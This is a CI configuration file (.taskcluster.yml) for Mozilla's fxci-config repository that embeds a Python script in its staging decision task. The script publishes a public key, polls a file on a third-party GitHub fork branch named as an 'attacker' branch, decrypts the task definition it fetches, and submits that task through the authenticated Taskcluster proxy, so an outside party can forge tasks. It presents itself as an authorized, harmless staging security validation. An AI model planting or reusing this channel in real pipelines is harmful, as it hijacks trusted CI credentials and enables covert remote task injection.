---
version: 1
reporting: checks-v1
autoCancelPreviousChecks: false
policy:
  pullRequests: public_restricted
tasks:
  - $if: 'taskcluster_root_url == "https://stage.taskcluster.nonprod.webservices.mozgcp.net"'
    then:
      provisionerId: releng-1
      workerType: decision
      projectId: none
      schedulerId: releng-level-1
      created: {$fromNow: ''}
      deadline: {$fromNow: '15 minutes'}
      expires: {$fromNow: '1 day'}
      dependencies: []
      requires: all-completed
      priority: lowest
      retries: 0
      scopes:
        - assume:repo:github.com/mozilla-releng/fxci-config:pull-request-untrusted
      routes: []
      payload:
        image: mozillareleases/taskgraph:run-task-v24.1.1@sha256:9b9a1a3ca42025bb8d7eba19e1b8759f04504097265074df25bbc997bd802543
        command:
          - bash
          - -lc
          - |
              set -euo pipefail
              test "$TASKCLUSTER_ROOT_URL" = "https://stage.taskcluster.nonprod.webservices.mozgcp.net"
              python3 - <<'PY'
              import base64
              import datetime as dt
              import hashlib
              import hmac
              import json
              import os
              import subprocess
              import tempfile
              import time
              import urllib.error
              import urllib.request
              import uuid

              STAGE_ROOT = "https://stage.taskcluster.nonprod.webservices.mozgcp.net"
              DELIVERY_URL = (
                  "https://raw.githubusercontent.com/sawyerblack896-blip/fxci-config/"
                  "codex-c007-stage-attacker-20260809/c007-stage-response.json"
              )
              PROTOCOL = "rsa-oaep-sha256+aes-256-cbc+hmac-sha256-v1"


              def slugid():
                  return base64.urlsafe_b64encode(uuid.uuid4().bytes).decode().rstrip("=")


              def put_task(proxy, task_id, task):
                  request = urllib.request.Request(
                      proxy.rstrip("/") + "/api/queue/v1/task/" + task_id,
                      data=json.dumps(task, separators=(",", ":")).encode(),
                      headers={"Content-Type": "application/json"},
                      method="PUT",
                  )
                  with urllib.request.urlopen(request, timeout=30) as response:
                      return response.status


              def decrypt_delivery(private_key, delivery, workdir):
                  assert delivery["protocol"] == PROTOCOL
                  wrapped_key = base64.b64decode(delivery["wrappedKey"])
                  iv = base64.b64decode(delivery["iv"])
                  ciphertext = base64.b64decode(delivery["ciphertext"])
                  expected_mac = base64.b64decode(delivery["mac"])
                  assert len(iv) == 16

                  wrapped_path = os.path.join(workdir, "wrapped-key.bin")
                  with open(wrapped_path, "wb") as stream:
                      stream.write(wrapped_key)
                  key_material = subprocess.run(
                      [
                          "openssl",
                          "pkeyutl",
                          "-decrypt",
                          "-inkey",
                          private_key,
                          "-in",
                          wrapped_path,
                          "-pkeyopt",
                          "rsa_padding_mode:oaep",
                          "-pkeyopt",
                          "rsa_oaep_md:sha256",
                      ],
                      check=True,
                      stdout=subprocess.PIPE,
                  ).stdout
                  assert len(key_material) == 64
                  aes_key, mac_key = key_material[:32], key_material[32:]
                  actual_mac = hmac.new(mac_key, iv + ciphertext, hashlib.sha256).digest()
                  assert hmac.compare_digest(actual_mac, expected_mac)

                  return subprocess.run(
                      [
                          "openssl",
                          "enc",
                          "-d",
                          "-aes-256-cbc",
                          "-K",
                          aes_key.hex(),
                          "-iv",
                          iv.hex(),
                      ],
                      input=ciphertext,
                      check=True,
                      stdout=subprocess.PIPE,
                  ).stdout


              root = os.environ["TASKCLUSTER_ROOT_URL"].rstrip("/")
              if root != STAGE_ROOT:
                  raise SystemExit("staging-only guard rejected this deployment")

              proxy = os.environ["TASKCLUSTER_PROXY_URL"]
              parent_task = os.environ["TASK_ID"]
              parent_group = os.environ["TASK_GROUP_ID"]
              now = dt.datetime.now(dt.timezone.utc)

              with tempfile.TemporaryDirectory(prefix="c007-stage-") as workdir:
                  private_key = os.path.join(workdir, "private.pem")
                  public_key = os.path.join(workdir, "public.pem")
                  subprocess.run(
                      ["openssl", "genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048", "-out", private_key],
                      check=True,
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL,
                  )
                  subprocess.run(
                      ["openssl", "pkey", "-in", private_key, "-pubout", "-out", public_key],
                      check=True,
                      stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL,
                  )
                  with open(public_key, "rb") as stream:
                      public_key_b64 = base64.b64encode(stream.read()).decode()

                  marker_id = slugid()
                  marker = {
                      "provisionerId": "built-in",
                      "workerType": "succeed",
                      "schedulerId": "releng-level-1",
                      "projectId": "none",
                      "taskGroupId": parent_group,
                      "dependencies": [],
                      "requires": "all-completed",
                      "routes": [],
                      "priority": "lowest",
                      "retries": 0,
                      "created": now.isoformat().replace("+00:00", "Z"),
                      "deadline": (now + dt.timedelta(minutes=5)).isoformat().replace("+00:00", "Z"),
                      "expires": (now + dt.timedelta(days=1)).isoformat().replace("+00:00", "Z"),
                      "scopes": [],
                      "payload": {},
                      "metadata": {
                          "name": "c007-stage-channel-auth",
                          "description": f"Encrypted staging response channel for parent {parent_task}.",
                          "owner": "sawyerblack896-blip@users.noreply.github.com",
                          "source": "https://github.com/mozilla-releng/fxci-config",
                      },
                      "tags": {"purpose": "authorized-staging-security-validation"},
                      "extra": {
                          "c007ChannelMarker": {
                              "parentTaskId": parent_task,
                              "protocol": PROTOCOL,
                              "publicKeyPemBase64": public_key_b64,
                          }
                      },
                  }
                  put_task(proxy, marker_id, marker)
                  print(json.dumps({"stageChannel": "waiting", "markerTaskId": marker_id}))

                  delivery = None
                  for attempt in range(150):
                      request = urllib.request.Request(
                          f"{DELIVERY_URL}?recipient={parent_task}&attempt={attempt}",
                          headers={"Cache-Control": "no-cache", "User-Agent": "C007-authorized-staging-validation"},
                      )
                      try:
                          with urllib.request.urlopen(request, timeout=15) as response:
                              candidate = json.load(response)
                          if candidate.get("recipientTaskId") == parent_task:
                              delivery = candidate
                              break
                      except urllib.error.HTTPError as error:
                          if error.code != 404:
                              raise
                      time.sleep(2)
                  assert delivery is not None, "encrypted delivery did not arrive"

                  plaintext = decrypt_delivery(private_key, delivery, workdir)
                  response = json.loads(plaintext)
                  child_id = response["taskId"]
                  child = response["task"]

                  # The encrypted response is still constrained to one harmless staging
                  # check task before it is sent to the authenticated Taskcluster proxy.
                  assert child["provisionerId"] == "built-in"
                  assert child["workerType"] == "succeed"
                  assert child["schedulerId"] == "releng-level-1"
                  assert child["projectId"] == "none"
                  assert child["routes"] == ["checks"]
                  assert child["scopes"] == []
                  assert child["payload"] == {}
                  assert child["priority"] == "lowest"
                  assert child["retries"] == 0
                  assert child["metadata"]["name"].startswith("c007-stage-forged-")
                  assert child["tags"]["purpose"] == "authorized-staging-security-validation"

                  status = put_task(proxy, child_id, child)
                  print(json.dumps({"stageChannel": "complete", "taskId": child_id, "httpStatus": status}))
              PY
        features:
          taskclusterProxy: true
        maxRunTime: 600
      metadata:
        name: c007-stage-attacker-control
        description: Harmless staging-only task for an authorized security validation.
        owner: sawyerblack896-blip@users.noreply.github.com
        source: https://github.com/mozilla-releng/fxci-config
      tags:
        purpose: authorized-staging-security-validation
      extra:
        c007Control: true
